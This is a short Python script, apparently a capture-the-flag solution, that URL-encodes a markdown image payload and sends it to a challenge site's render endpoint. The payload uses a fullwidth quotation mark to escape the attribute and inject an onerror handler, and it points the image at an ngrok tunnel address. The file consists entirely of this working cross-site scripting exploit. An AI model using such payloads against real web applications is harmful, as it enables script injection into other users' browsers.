from signal import pause
import urllib.parse
import requests

URL="https://mk.mc.ax/"
FORWARDED_URL="https://acd7-126-151-102-16.jp.ngrok.io"

s = requests.Session()
payload = (
    f"![Uhoh...＂\"onerror=alert(1)]({FORWARDED_URL})"
)
payload = urllib.parse.quote(payload)
print("payload:", payload)
res = s.get(f"{URL}render?content={payload}")

import html
print(html.unescape(res.text))
